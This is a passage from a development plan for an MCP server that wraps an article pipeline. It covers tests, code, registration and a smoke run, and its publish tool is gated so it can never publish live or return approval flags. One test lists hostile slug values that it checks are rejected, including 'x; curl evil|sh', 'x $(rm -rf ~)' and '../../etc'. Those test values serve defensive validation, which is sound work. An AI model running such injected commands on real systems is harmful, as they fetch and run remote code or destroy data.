    return env
```

- [ ] **Step 4: Register the tool in `server.py`**

Add to `_FACTORY_VERBS`:

```python
    "factory_review": verbs.review,
```

Insert in `list_tools()` before the closing `]`:

```python
        types.Tool(
            name="factory_review",
            description=(
                "Run the MANDATORY content_reviewer.py quality gate on one article "
                "(never skip this before publishing). review_passed=true means the "
                "article passed; review_passed=false means it FAILED **or the slug "
                "was not found** (the script exits 1 for both) — read stdout_tail to "
                "distinguish; a failing review is a real result, not a tool error. "
                "The reviewer's --fix override (mark-as-passed) is NOT available "
                "through this tool — it is an operator-CLI-only action. Returns the "
                "standard envelope + review_passed."
            ),
            inputSchema={
                "type": "object",
                "required": ["slug"],
                "additionalProperties": False,
                "properties": {
                    "slug": {"type": "string",
                             "pattern": "^[a-z0-9][a-z0-9-]{0,80}$",
                             "description": "Article slug."},
                    "site": {
                        "type": "string",
                        "description": "Override site for per-site thresholds, "
                                       "e.g. 'travelsfy'."
                    },
                },
            },
        ),
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd /home/jarvis/.openclaw/workspace/jarvis-project/factory-mcp && .venv/bin/python -m pytest`
Expected: `39 passed`.

- [ ] **Step 6: Commit**

```bash
cd /home/jarvis/.openclaw/workspace/jarvis-project
git add factory-mcp/src/factory_mcp/verbs.py factory-mcp/src/factory_mcp/server.py \
        factory-mcp/tests/test_review.py
git commit -m "feat(factory-mcp): factory_review verb wrapping content_reviewer.py"
```

---

### Task 7: `factory_publish` — gated preview/schedule-prep (NEVER live)

**Files:**
- Modify: `factory-mcp/src/factory_mcp/verbs.py` (append)
- Modify: `factory-mcp/src/factory_mcp/server.py` (one Tool + one dispatch entry)
- Create: `factory-mcp/tests/test_publish.py`

**Interfaces:**
- Consumes: same helpers/fixtures; `state.get_article` (routing lookup); `PUBLISH_TIMEOUT_S`.
- Produces: `verbs.publish(arguments: dict) -> dict` — standard envelope PLUS `"publisher": "wp_publisher.py" | "tpi_publisher.py"` and `"operator_command": str` — a plainly **NON-executable** next-step instruction (review B1): it names the publisher script and the shlex-quoted slug/schedule but NEVER contains `--approve` or `--ack-jose-approved` and is never a paste-and-run command; OR (for `dry_run: false`) a refusal dict `{ok: false, verb: "publish", slug, publisher, error: "live_publish_not_available", message, operator_command}` with NO subprocess run — the refusal carries the same non-executable instruction and the same no-approval-tokens rule.
- Backing CLIs (verified 2026-07-07):
  - `wp_publisher.py --slug X (--dry-run | --approve) [--schedule UTC_ISO] [--force] [--ack-jose-approved]` — the script computes `dry_run = not args.approve`, so `--schedule` only takes effect WITH `--approve`; with `--dry-run` it is validated/previewed only. Exits 1 when the result status is "error" (dry-run validation failures included).
  - `tpi_publisher.py (--slug X | --all) (--dry-run | --approve) [--rebuild] [--schedule ISO_UTC]` — `--dry-run` wins if both flags are given; `--schedule` writes `state/tpi-schedule-queue.json` only on the `--approve` path.
- **Consequence (spec §3.3, as revised 2026-07-07):** since this tool can NEVER emit `--approve`, `schedule` is **schedule-prep only**: the timestamp is validated by the MCP (timezone-aware ISO-8601 with a time component — date-only and naive strings are rejected), passed to the publisher alongside `--dry-run` for its own validation/preview, and echoed inside the `operator_command` instruction. The MCP itself never writes the schedule queue (spec §3.4: MCP never writes state). **B1 rule:** `operator_command` is an INSTRUCTION, not a command — the tool must never pre-compose a runnable live-publish line (for TPI, `tpi_publisher.py --approve` has no Bash-hook guard at all, so a runnable string would be a zero-gate live publish; for WP, emitting `--ack-jose-approved` would fabricate the deliberate human-approval token the guard hook exists to require). The operator types the approval flags themselves after Jose's explicit go-ahead.

- [ ] **Step 1: Write the failing test**

Create `factory-mcp/tests/test_publish.py`:

```python
import json

import pytest

from factory_mcp import state, verbs

FORBIDDEN = ("--approve", "--ack-jose-approved", "--force", "--rebuild", "--all")


def test_publish_default_dry_run_wp_mapping(fake_runner, canned_state):
    out = verbs.publish({"slug": "some-slug", "site": "travelsfy.com"})
    assert fake_runner.calls == [{
        "script": "wp_publisher.py",
        "args": ["--slug", "some-slug", "--dry-run"],
        "timeout_s": verbs.PUBLISH_TIMEOUT_S,
    }]
    assert out["verb"] == "publish" and out["publisher"] == "wp_publisher.py"
    assert "--dry-run" in out["cmd"]
    # B1: operator_command is a NON-executable instruction — it names the
    # publisher + slug but must NOT contain the approval flags.
    assert "wp_publisher.py" in out["operator_command"]
    assert "some-slug" in out["operator_command"]
    assert "--approve" not in out["operator_command"]
    assert "--ack-jose-approved" not in out["operator_command"]


def test_publish_routes_travelplan_to_tpi(fake_runner, canned_state, monkeypatch):
    monkeypatch.setattr(state, "get_article",
                        lambda slug: {"slug": slug, "site": "travelplaninfo"})
    out = verbs.publish({"slug": "tpi-article"})
    assert fake_runner.calls[0]["script"] == "tpi_publisher.py"
    assert out["publisher"] == "tpi_publisher.py"
    assert "tpi_publisher.py" in out["operator_command"]
    assert "--approve" not in out["operator_command"]  # B1 — tpi has NO hook guard


def test_publish_explicit_site_overrides_db(fake_runner, canned_state, monkeypatch):
    monkeypatch.setattr(state, "get_article",
                        lambda slug: {"slug": slug, "site": "travelplaninfo"})
    verbs.publish({"slug": "s", "site": "123cts"})
    assert fake_runner.calls[0]["script"] == "wp_publisher.py"


def test_publish_schedule_validated_and_passed_with_dry_run(fake_runner, canned_state):
    out = verbs.publish({"slug": "s", "site": "travelsfy.com",
                         "schedule": "2026-08-01T14:00:00Z"})
    assert fake_runner.calls[0]["args"] == [
        "--slug", "s", "--dry-run", "--schedule", "2026-08-01T14:00:00Z"]
    assert "2026-08-01T14:00:00Z" in out["operator_command"]  # echoed for the operator
    assert "--approve" not in out["operator_command"]
    assert "--approve" not in out["cmd"]


def test_publish_rejects_malformed_schedule(fake_runner):
    # tz-aware WITH a time component required: reject junk, date-only, naive.
    for bad in ("tomorrow 2pm", "2026-08-01", "2026-08-01T14:00:00"):
        with pytest.raises(ValueError, match="schedule"):
            verbs.publish({"slug": "s", "site": "travelsfy.com", "schedule": bad})
    assert fake_runner.calls == []


def test_publish_refuses_live_request_without_subprocess(fake_runner, canned_state):
    out = verbs.publish({"slug": "s", "site": "travelsfy.com", "dry_run": False})
    assert out["ok"] is False
    assert out["error"] == "live_publish_not_available"
    assert "operator_command" in out
    assert "cmd" not in out            # no subprocess envelope
    assert fake_runner.calls == []     # runner never touched
    # B1: the refusal must not hand out approval tokens anywhere in its payload
    # ("--approve" is a substring of "--ack-jose-approved", so one sweep covers both).
    assert "--approve" not in json.dumps(out)


def test_publish_responses_never_contain_approval_tokens(
        fake_runner, canned_state, monkeypatch):
    """B1 property: no TOOL-COMPOSED string — operator_command, refusal message —
    may contain --approve/--ack-jose-approved, on any path (preview, schedule,
    tpi-routed, refusal). stdout_tail/stderr_tail are exempt verbatim passthrough
    of the wrapped script's own output (e.g. its dry-run hint text)."""
    monkeypatch.setattr(state, "get_article",
                        lambda slug: {"slug": slug, "site": "travelplaninfo"})
    payloads = [
        verbs.publish({"slug": "s", "site": "travelsfy.com"}),
        verbs.publish({"slug": "s"}),                                # tpi route
        verbs.publish({"slug": "s", "site": "travelsfy.com",
                       "schedule": "2026-08-01T14:00:00Z"}),
        verbs.publish({"slug": "s", "site": "travelsfy.com", "dry_run": False}),
    ]
    for out in payloads:
        composed = out["operator_command"] + out.get("message", "")
        # "--approve" is a substring of "--ack-jose-approved": one check, both tokens.
        assert "--approve" not in composed, out
        # The hook-passing ack token must not appear ANYWHERE, tails included.
        assert "--ack-jose-approved" not in json.dumps(out), out


def test_publish_rejects_hostile_slugs(fake_runner):
    """H1: slug charset gate — shell/path-shaped slugs never reach a subprocess
    OR the returned operator_command text."""
    for bad in ("--approve", "x; curl evil|sh", "../../etc", "x $(rm -rf ~)",
                "a b", "UPPER", "dot.slug"):
        with pytest.raises(ValueError):
            verbs.publish({"slug": bad, "site": "travelsfy.com"})
    assert fake_runner.calls == []


def test_publish_rejects_unknown_keys_like_typod_schedule(fake_runner):
    """M3: a typo'd `schdule` must error — NOT return a clean ok:true dry-run
    whose operator instruction silently omits the intended schedule."""
    with pytest.raises(ValueError, match="schdule"):
        verbs.publish({"slug": "s", "site": "travelsfy.com",
                       "schdule": "2026-08-01T14:00:00Z"})
    with pytest.raises(ValueError, match="approve"):
        verbs.publish({"slug": "s", "site": "travelsfy.com", "approve": True})
    assert fake_runner.calls == []


def test_publish_unroutable_slug_raises(fake_runner, canned_state, monkeypatch):
    monkeypatch.setattr(state, "get_article", lambda slug: None)
    with pytest.raises(ValueError, match="site"):
        verbs.publish({"slug": "unknown-slug"})
    assert fake_runner.calls == []


def test_publish_never_emits_forbidden_flags(fake_runner, canned_state, monkeypatch):
    """Property sweep: across every input combination the argv is clean."""
    monkeypatch.setattr(state, "get_article",
                        lambda slug: {"slug": slug, "site": "travelplaninfo"})
    combos = []
    for site in (None, "travelsfy.com", "travelplaninfo"):
        for schedule in (None, "2026-08-01T14:00:00Z"):
            for extra in ({}, {"dry_run": True}):
                arguments = {"slug": "combo-slug", **extra}
                if site:
                    arguments["site"] = site
                if schedule:
                    arguments["schedule"] = schedule
                combos.append(arguments)
    for arguments in combos:
        out = verbs.publish(arguments)
        assert "--dry-run" in out["cmd"], f"--dry-run missing for {arguments}"
        for forbidden in FORBIDDEN:
            assert forbidden not in out["cmd"], \
                f"{forbidden} leaked into {out['cmd']} for {arguments}"
    assert len(fake_runner.calls) == len(combos) == 12
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd /home/jarvis/.openclaw/workspace/jarvis-project/factory-mcp && .venv/bin/python -m pytest tests/test_publish.py`
Expected: FAIL — `AttributeError: module 'factory_mcp.verbs' has no attribute 'publish'`.

- [ ] **Step 3: Implement `verbs.publish`**

First add two imports at the TOP of `factory-mcp/src/factory_mcp/verbs.py`, alongside the existing imports:

```python
import shlex
from datetime import datetime
```

Then append to the end of the file:

```python
# ── factory_publish — preview/schedule-prep ONLY (spec §3.3) ─────────────────
#
# HARD GATE, both directions:
#   argv side  — this verb always passes --dry-run and can never pass the
#                approval flags (runner.FORBIDDEN_FLAGS backstops at runtime).
#   response side (review B1) — NO string this verb COMPOSES (operator_command,
#                refusal message) may contain the approval flags or a runnable
#                live-publish command; stdout/stderr tails are verbatim script
#                passthrough and are the sole exemption. The Bash guard hook
#                treats the ack flag as a deliberate human-typed token;
#                pre-composing it here would hand every caller a hook-passing
#                paste-and-run live publish (and tpi_publisher has no hook
#                guard at all). operator_command is therefore a plainly
#                NON-executable next-step instruction: the operator types the
#                approval flags themselves after Jose's explicit go-ahead.

def _operator_instruction(publisher: str, slug: str, schedule: str | None) -> str:
    """Non-executable next step. shlex.quote guards the interpolations (H1)
    even though this string is never meant to be executed."""
    action = (f"schedule {shlex.quote(slug)} for {shlex.quote(schedule)}"
              if schedule else f"publish {shlex.quote(slug)} live")
    return (
        f"NOT A RUNNABLE COMMAND. To {action}: get Jose's explicit go-ahead, "
        f"then a human operator runs command-post/{publisher} for this slug "
        "from the jarvis-project root, typing the approval flag(s) themselves "
        "(the publish guard requires the deliberate ack token — this tool "
        "never emits approval flags in any response)."
    )


def publish(arguments: dict[str, Any]) -> dict:
    """Wrap wp_publisher.py / tpi_publisher.py in --dry-run mode only."""
    _reject_unknown_keys(arguments, {"slug", "site", "dry_run", "schedule"})
    slug = _slug(arguments)
    site = _optional_str(arguments, "site")
    schedule = _optional_str(arguments, "schedule")
    dry_run = arguments.get("dry_run", True)

    if schedule is not None:
        try:
            parsed = datetime.fromisoformat(schedule.replace("Z", "+00:00"))
        except ValueError:
            parsed = None
        # Tighter than bare fromisoformat: require a time component AND an
        # explicit offset — date-only ("2026-08-01") and naive
        # ("2026-08-01T14:00:00") strings would silently shift the WP date_gmt.
        if parsed is None or parsed.tzinfo is None or "T" not in schedule:
            raise ValueError(
                "`schedule` must be a timezone-aware UTC ISO-8601 timestamp "
                "with a time component, e.g. 2026-08-01T14:00:00Z."
            )

    if site is None:
        row = state.get_article(slug)
        site = (row or {}).get("site")
    if not site:
        raise ValueError(
            f"Cannot route publish for slug '{slug}': not found in the articles "
            "table. Pass `site` explicitly (e.g. 'travelplaninfo', 'travelsfy.com', "
            "'airportspickup.com')."
        )

    publisher = "tpi_publisher.py" if site.startswith("travelplan") else "wp_publisher.py"
    operator_command = _operator_instruction(publisher, slug, schedule)

    if dry_run is not True:
        return {
            "ok": False,
            "verb": "publish",
            "slug": slug,
            "publisher": publisher,
            "error": "live_publish_not_available",
            "message": (
                "factory_publish is preview/validation only — it never performs "
                "a live publish and never returns a runnable live-publish "
                "command. Live or scheduled publishing is a human operator "
                "action taken only after Jose's explicit go-ahead; see "
                "operator_command for the (non-executable) next step."
            ),
            "operator_command": operator_command,
        }

    args = ["--slug", slug, "--dry-run"]
    if schedule:
        args += ["--schedule", schedule]

    run = runner.run_script(publisher, args, timeout_s=PUBLISH_TIMEOUT_S)
    env = _envelope("publish", slug, run)
    env["publisher"] = publisher
    env["operator_command"] = operator_command
    return env
```

- [ ] **Step 4: Register the tool in `server.py`**

Add to `_FACTORY_VERBS`:

```python
    "factory_publish": verbs.publish,
```

Insert in `list_tools()` before the closing `]`:

```python
        types.Tool(
            name="factory_publish",
            description=(
                "PREVIEW/VALIDATION ONLY — always runs the publisher in dry-run mode "
                "and is structurally unable to publish live (it never emits any "
                "approval flag, at any layer, in any response; requesting "
                "dry_run=false returns a refusal without running anything). Routes by "
                "site: travelplan* -> tpi_publisher.py (TPI Next.js app), everything "
                "else -> wp_publisher.py (WordPress). `schedule` validates a "
                "timezone-aware UTC ISO-8601 timestamp and previews it; the MCP never "
                "writes the schedule queue. Live/scheduled publishing is a human "
                "operator action after Jose's explicit go-ahead — the returned "
                "operator_command is a NON-executable instruction describing that "
                "step, never a runnable command. Returns the standard envelope + "
                "publisher + operator_command."
            ),
            inputSchema={
                "type": "object",
                "required": ["slug"],
                "additionalProperties": False,
                "properties": {
                    "slug": {"type": "string",
                             "pattern": "^[a-z0-9][a-z0-9-]{0,80}$",
                             "description": "Article slug."},
                    "site": {
                        "type": "string",
                        "description": "Override routing when the article is not in the "
                                       "DB. travelplan* -> tpi_publisher.py, otherwise "
                                       "wp_publisher.py."
                    },
                    "dry_run": {
                        "type": "boolean", "default": True,
                        "description": "Must remain true — this tool cannot publish "
                                       "live. false returns a structured refusal (no "
                                       "subprocess, no runnable command returned)."
                    },
                    "schedule": {
                        "type": "string",
                        "description": "Timezone-aware UTC ISO-8601 with a time "
                                       "component, e.g. 2026-08-01T14:00:00Z. Validated "
                                       "+ previewed only; the real scheduling is the "
                                       "operator's action (see operator_command)."
                    },
                },
            },
        ),
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd /home/jarvis/.openclaw/workspace/jarvis-project/factory-mcp && .venv/bin/python -m pytest && .venv/bin/python -c "import factory_mcp.server as s; print(sorted(s._FACTORY_VERBS))"`
Expected: `50 passed` and `['factory_assemble', 'factory_draft', 'factory_images', 'factory_publish', 'factory_review', 'factory_status']`.

- [ ] **Step 6: Commit**

```bash
cd /home/jarvis/.openclaw/workspace/jarvis-project
git add factory-mcp/src/factory_mcp/verbs.py factory-mcp/src/factory_mcp/server.py \
        factory-mcp/tests/test_publish.py
git commit -m "feat(factory-mcp): gated factory_publish verb — dry-run/schedule-prep only, never --approve"
```

---

### Task 8: MCP client registration + integration smoke on a throwaway slug

> **STOP GATE (before starting this task):** the orchestrator must confirm the go-ahead with the main session before dispatching Task 8. It (a) registers the server in Jose's user-scope Claude Code config, and (b) runs ONE real article draft through sonnet_writer.py ($0 on the Max plan via the Claude CLI, but several minutes and a real content-pipeline + DB write, cleaned up in Step 6). Images and publish run dry-run only — zero image/publish cost. Do not proceed without that confirmation.

**Files:**
- Create: `factory-mcp/scripts/smoke_client.py`
- Modify: `factory-mcp/README.md` (append registration + tools section)
- Modify (via CLI only, never by editing the file): `~/.claude.json` user-scope `mcpServers` through `claude mcp add`

**Interfaces:**
- Consumes: the complete server (Tasks 1-7); real pipeline scripts + real `state/jarvis.db`.
- Produces: registered `factory-mcp` entry alongside the existing `jcodemunch`/`context7`/`playwright` stdio servers; a repeatable smoke script.

- [ ] **Step 1: Write the smoke client**

Create `factory-mcp/scripts/smoke_client.py`:

```python
#!/usr/bin/env python3
"""Integration smoke for factory-mcp — real MCP client over stdio, real subprocesses.

Drives: tools/list -> legacy list_queue -> status -> draft (REAL, $0 Claude-CLI
path, minutes) -> images(dry_run) -> assemble -> review -> publish(dry_run) ->
publish live-refusal -> status, on a throwaway slug. Hard-asserts MECHANICS
(envelope shape, argv hygiene, no approval tokens in argv OR in any response
payload); editorial outcomes (review
pass/fail, publish dry-run validation findings on an image-less throwaway) are
RECORDED, not asserted — a truthful ok=false with visible tails is correct
behavior there.

Run manually (never pytest-collected):
    cd factory-mcp && .venv/bin/python scripts/smoke_client.py
Cleanup afterwards: plan Task 8 Step 6.
"""
import asyncio
import json
import sys
from datetime import date, timedelta
from pathlib import Path

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

ROOT = Path(__file__).resolve().parent.parent          # factory-mcp/
SLUG = f"factory-smoke-{date.today():%Y%m%d}"

EXPECTED_TOOLS = {
    "list_events", "get_event", "list_queue",
    "factory_status", "factory_draft", "factory_images",
    "factory_assemble", "factory_review", "factory_publish",
}
ENVELOPE_KEYS = {"ok", "verb", "slug", "exit_code", "timed_out", "duration_s",
                 "cmd", "stdout_tail", "stderr_tail", "resulting_state"}

failures: list[str] = []


def check(name: str, cond: bool, detail: str = "") -> None:
    print(f"{'PASS' if cond else 'FAIL'}  {name}" + ("" if cond else f"  — {detail}"))
    if not cond:
        failures.append(name)


def parse(result) -> dict:
    assert not result.isError, f"tool returned isError: {result.content!r}"
    assert result.content and result.content[0].type == "text", \
        f"unexpected content: {result.content!r}"
    return json.loads(result.content[0].text)


async def main() -> int:
    params = StdioServerParameters(
        command=str(ROOT / ".venv" / "bin" / "python"), args=["-m", "factory_mcp"])
    async with stdio_client(params) as (read, write):
        async with ClientSession(
                read, write, read_timeout_seconds=timedelta(seconds=2700)) as session:
            await session.initialize()

            tools = await session.list_tools()
            names = {t.name for t in tools.tools}
            check("tools/list exposes all 9 tools (3 legacy + 6 verbs)",
                  EXPECTED_TOOLS <= names and len(names) == 9, f"got {sorted(names)}")

            legacy = parse(await session.call_tool("list_queue", {}))
            check("legacy list_queue still works", isinstance(legacy, dict))

            st = parse(await session.call_tool("factory_status", {"limit": 3}))
            # NOTE: `total >= 1` is an environment assertion — it assumes the
            # production DB is non-empty (true on this box today).
            check("factory_status lists from SQLite",
                  st["ok"] is True and st["total"] >= 1 and len(st["articles"]) <= 3,
                  json.dumps(st)[:300])

            print(f"\n--- factory_draft {SLUG} (REAL run — several minutes) ---")
            draft = parse(await session.call_tool("factory_draft", {
                "slug": SLUG, "site": "travelplaninfo",
                "keywords": ["factory mcp smoke test"], "words": 700}))
            print(json.dumps(draft, indent=2)[:2000])
            check("draft envelope shape", ENVELOPE_KEYS <= set(draft))
            check("draft ok", draft["ok"] is True,
                  f"exit={draft['exit_code']} stderr={draft['stderr_tail'][-500:]}")
            check("draft resulting_state has DB row (sonnet_writer upserts)",
                  (draft["resulting_state"]["article"] or {}).get("stage") == "in_progress",
                  json.dumps(draft["resulting_state"])[:300])

            imgs = parse(await session.call_tool(
                "factory_images", {"slug": SLUG, "dry_run": True}))
            check("images(dry_run) ok — zero API calls",
                  imgs["ok"] is True and "--dry-run" in imgs["cmd"],
                  f"exit={imgs['exit_code']} stderr={imgs['stderr_tail'][-500:]}")

            asm = parse(await session.call_tool("factory_assemble", {"slug": SLUG}))
            check("assemble ok", asm["ok"] is True,
                  f"exit={asm['exit_code']} stderr={asm['stderr_tail'][-500:]}")

            rev = parse(await session.call_tool("factory_review", {"slug": SLUG}))
            check("review envelope carries review_passed", "review_passed" in rev)
            print(f"review outcome (recorded, not asserted): "
                  f"review_passed={rev['review_passed']} "
                  f"stdout_tail={rev['stdout_tail'][-400:]}")

            pub = parse(await session.call_tool("factory_publish", {"slug": SLUG}))
            check("publish routed to tpi_publisher.py",
                  pub.get("publisher") == "tpi_publisher.py", json.dumps(pub)[:300])
            check("publish argv contains --dry-run", "--dry-run" in pub["cmd"])
            check("publish argv NEVER contains --approve",
                  "--approve" not in pub["cmd"], f"cmd={pub['cmd']}")
            # B1: tool-COMPOSED strings carry no approval tokens ("--approve" is
            # a substring of "--ack-jose-approved", so one check covers both).
            # stdout_tail is exempt passthrough — tpi_publisher's own dry-run
            # hint legitimately says "Run with --approve to publish".
            check("publish operator_command is NON-executable (no approval tokens)",
                  bool(pub.get("operator_command"))
                  and "--approve" not in pub["operator_command"],
                  json.dumps(pub)[:300])
            check("hook-passing ack token appears NOWHERE in the payload",
                  "--ack-jose-approved" not in json.dumps(pub),
                  json.dumps(pub)[:300])
            print(f"publish dry-run outcome (recorded, not asserted): "
                  f"ok={pub['ok']} stdout_tail={pub['stdout_tail'][-400:]}")

            refusal = parse(await session.call_tool(
                "factory_publish", {"slug": SLUG, "dry_run": False}))
            check("live publish refused (and no approval tokens in the refusal)",
                  refusal["ok"] is False
                  and refusal["error"] == "live_publish_not_available"
                  and "cmd" not in refusal
                  and "--approve" not in json.dumps(refusal),
                  json.dumps(refusal)[:300])

            final = parse(await session.call_tool("factory_status", {"slug": SLUG}))
            check("status finds the throwaway slug", final["total"] == 1,
                  json.dumps(final)[:300])

    print(f"\n{'SMOKE PASS' if not failures else 'SMOKE FAIL'} "
          f"({len(failures)} failure(s): {failures})")
    return 1 if failures else 0


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
```

- [ ] **Step 2: Run the smoke**

Run: `cd /home/jarvis/.openclaw/workspace/jarvis-project/factory-mcp && .venv/bin/python scripts/smoke_client.py`
Expected: every `check` line prints `PASS` and the script ends `SMOKE PASS (0 failure(s): [])`, exit code 0. The draft step takes minutes — do not interrupt. The two "recorded, not asserted" lines (review outcome, publish dry-run outcome) may show `False`/failures for the image-less throwaway — copy them into the report. If ANY line prints `FAIL`, stop and report the full output verbatim — do not patch anything.

- [ ] **Step 3: Register in the Claude Code user config**

```bash
claude mcp add --scope user factory-mcp -- \
  /home/jarvis/.openclaw/workspace/jarvis-project/factory-mcp/.venv/bin/python -m factory_mcp
claude mcp list
```

Expected: `claude mcp list` shows `factory-mcp` as a stdio server (command above) with a healthy/connected status, alongside `jcodemunch`, `context7`, `playwright`. If it shows failed/disconnected, stop and report.

**Client tool-call timeout (review M1):** the smoke client sets `read_timeout_seconds=2700` explicitly, but the REGISTERED consumer is Claude Code, whose MCP tool-call timeout is not configured anywhere by default and may abort a 2-10 minute `factory_draft` mid-run (the server-side group-kill then prevents orphans, but the caller sees an abort and may retry → duplicate drafts). Check the current `claude` docs/`--help` for the MCP tool-timeout setting (historically the `MCP_TOOL_TIMEOUT` env var, in ms) and record in the README the setting that makes the client timeout exceed `DRAFT_TIMEOUT_S` (2400s) — e.g. `MCP_TOOL_TIMEOUT=2700000`. If no such setting exists in the installed version, record THAT in the README with a warning to keep drafts out of impatient clients. MCP progress notifications are the eventual fix (deferred; spec §1 criterion 2).

- [ ] **Step 4: Update the README**

Append to `factory-mcp/README.md`:

```markdown
## Tools (Phase 2 — 6-verb surface)

| Tool | Wraps | Notes |
|---|---|---|
| `factory_status` | `db.get_articles()` (SQLite) | read-only source of truth |
| `factory_draft` | `sonnet_writer.py` | $0 Claude-CLI path; never `--batch` |
| `factory_images` | `image_pipeline.py` | `dry_run` = zero API calls; never `--all` |
| `factory_assemble` | `content_assembler.py` | |
| `factory_review` | `content_reviewer.py` | mandatory gate; the `--fix` self-green override is operator-CLI-only (NOT exposed) |
| `factory_publish` | `wp_publisher.py` / `tpi_publisher.py` | **always `--dry-run`; can never `--approve`** — `operator_command` is a NON-executable next-step instruction (no approval flags in any response); the human operator composes the live/scheduled publish themselves |

Action verbs run `/usr/bin/python3 command-post/<script>.py` via subprocess and
return `{ok, verb, slug, exit_code, timed_out, duration_s, cmd, stdout_tail,
stderr_tail, resulting_state}`. `runner.run_script()` additionally enforces a
frozen forbidden-flag denylist at runtime (raises before spawning) — the publish
gate is a mechanism, not just tests. Follow-up hardening candidates (out of
scope here): a PreToolUse hook matching `mcp__factory-mcp__.*`, or an env token
required by the publishers for `--approve`.

## Register (Claude Code, user scope)

    claude mcp add --scope user factory-mcp -- \
      /home/jarvis/.openclaw/workspace/jarvis-project/factory-mcp/.venv/bin/python -m factory_mcp

Long verbs (draft/images) can run up to 2400s server-side; the CLIENT's MCP
tool-call timeout must exceed that (Task 8 Step 3 records the setting verified
for the installed Claude Code version, e.g. `MCP_TOOL_TIMEOUT=2700000` ms).
On timeout the runner SIGKILLs the whole process group, so no `claude` CLI
grandchild survives a timed-out draft.

## Tests / smoke

    .venv/bin/pip install -e ".[dev]"
    .venv/bin/python -m pytest                     # unit (subprocess mocked)
    .venv/bin/python scripts/smoke_client.py       # integration (real subprocesses; see plan Task 8)
```

- [ ] **Step 5: Verify the registration path**

Run: `claude mcp list`
Expected: `factory-mcp` connected. (Tool-level visibility was already proven in Step 2 via a real MCP client `tools/list`; this step proves the registration Jose will actually use.)

- [ ] **Step 6: Clean up the throwaway slug (sanctioned state touch)**

```bash
cd /home/jarvis/.openclaw/workspace/jarvis-project
find content-pipeline/travelplaninfo -maxdepth 2 -type d -name "factory-smoke-*"
# Delete exactly the directory(ies) printed above, e.g.:
rm -rf "content-pipeline/travelplaninfo/$(date +%F)/factory-smoke-$(date +%Y%m%d)"
sqlite3 state/jarvis.db "DELETE FROM articles WHERE slug LIKE 'factory-smoke-%';"
# Ghost FTS rows would feed the duplicate-detector; costs rows would pollute totals:
sqlite3 state/jarvis.db "DELETE FROM article_fts WHERE slug LIKE 'factory-smoke-%';" || true
sqlite3 state/jarvis.db "DELETE FROM article_costs WHERE slug LIKE 'factory-smoke-%';" || true
cd command-post && /usr/bin/python3 -c "import db; db.export_queue_json(); print('queue.json regenerated')"
cd .. && sqlite3 state/jarvis.db "SELECT COUNT(*) FROM articles WHERE slug LIKE 'factory-smoke-%';"
sqlite3 state/jarvis.db "SELECT COUNT(*) FROM article_fts WHERE slug LIKE 'factory-smoke-%';"
grep -c "factory-smoke" state/queue.json || true
grep -c "factory-smoke" state/image-batches.json || true
```

Expected: both `SELECT COUNT(*)` lines print `0`; both greps print `0` (grep exits 1 on zero matches — the `|| true` keeps the shell happy). `state/article-events.jsonl` entries for the smoke slug are append-only history and are intentionally left in place. If the image-batches grep is non-zero, report it and leave the file alone — do not edit it.

- [ ] **Step 7: Commit**

```bash
cd /home/jarvis/.openclaw/workspace/jarvis-project
git add factory-mcp/scripts/smoke_client.py factory-mcp/README.md
git commit -m "feat(factory-mcp): MCP-client integration smoke + registration docs"
```

> **STOP GATE (end of task):** report the full smoke output, the `claude mcp list` output, and the cleanup verification verbatim to the orchestrator. The main session (with Jose) reviews before Task 9.

---

### Task 9: Full gate + report

**Files:** none (verification only)

- [ ] **Step 1: Full unit gate**

Run: `cd /home/jarvis/.openclaw/workspace/jarvis-project/factory-mcp && .venv/bin/python -m pytest`
Expected: `50 passed`. If anything fails, stop and report the exact output — do not patch beyond this plan.

- [ ] **Step 2: Grep guards**

```bash
cd /home/jarvis/.openclaw/workspace/jarvis-project/factory-mcp
grep -c 'name="factory_' src/factory_mcp/server.py
grep -rn -- "--approve" src/factory_mcp/
grep -rn -- "--ack-jose-approved" src/factory_mcp/
grep -rn -- "--fix" src/factory_mcp/*.py
grep -rn -- "--batch" src/factory_mcp/*.py; grep -rn -- "--audit" src/factory_mcp/*.py
.venv/bin/python -c "import factory_mcp.runner as r; assert '--approve' in r.FORBIDDEN_FLAGS and '--fix' in r.FORBIDDEN_FLAGS; print('runtime denylist present')"
.venv/bin/python -c "import factory_mcp.server as s; assert len(s._FACTORY_VERBS) == 6; print('6 verbs wired')"
```

Expected: the first grep prints exactly `6`. The `--approve` and `--ack-jose-approved` greps hit ONLY (a) the `FORBIDDEN_FLAGS` frozenset + gate comment in `runner.py` and (b) comments/docstrings in the publish section of `verbs.py` — **NEVER** a line that appends to an `args` list, and **NEVER** inside any returned string (`_operator_instruction` body, refusal `message`, Tool descriptions — B1 keeps returned text free of approval tokens; the unit tests assert this too). The `--fix`/`--batch`/`--audit` greps hit only the `runner.py` denylist and docstrings/comments — never argv construction. The two python lines print `runtime denylist present` and `6 verbs wired`.

- [ ] **Step 3: Registration health**

Run: `claude mcp list`
Expected: `factory-mcp` still connected.

- [ ] **Step 4: Report**

Report verbatim to the orchestrator: the pytest summary, all grep-guard output, and `claude mcp list`. Do NOT push, do NOT open a PR, do NOT merge — branch completion (merge of `feat/factory-mcp-verbs`) is handled by the main session after Fable verification, per `superpowers:finishing-a-development-branch`.

---

## Rollback

The scaffold was git-clean before this plan and every change under `factory-mcp/` is additive (new modules/tests/scripts; `server.py` gains imports + Tools + one dispatch branch; the 3 legacy tools are untouched and smoke-verified). **BUT the branch is NOT state-neutral:** the heartbeat daemon auto-commits live `state/` + `content-pipeline/` mutations to whatever branch is checked out, so after days on `feat/factory-mcp-verbs` a bare `git checkout main && git branch -D` would rewind those tracked files on disk to main's OLDER content and discard the interim auto-commits — real pipeline mutations lost, not just plan artifacts. Roll back in this order:

```bash
cd /home/jarvis/.openclaw/workspace/jarvis-project

# 1. See what the heartbeat auto-committed on the branch:
git log --oneline main..feat/factory-mcp-verbs -- state/ content-pipeline/

# 2. Salvage BEFORE deleting the branch. content-pipeline/ auto-commits are NOT
#    regenerable from the DB — cherry-pick any `Auto-commit ...` commits touching
#    files you must keep onto main (or copy the files out) first. state/ JSON
#    exports ARE regenerable (step 4).
git checkout main
# (optional, per inspection): git cherry-pick <auto-commit shas>

# 3. Only after step 2's inspection/salvage:
git branch -D feat/factory-mcp-verbs                      # discard all task commits

# 4. Regenerate the DB-derived state JSONs so on-disk state matches the
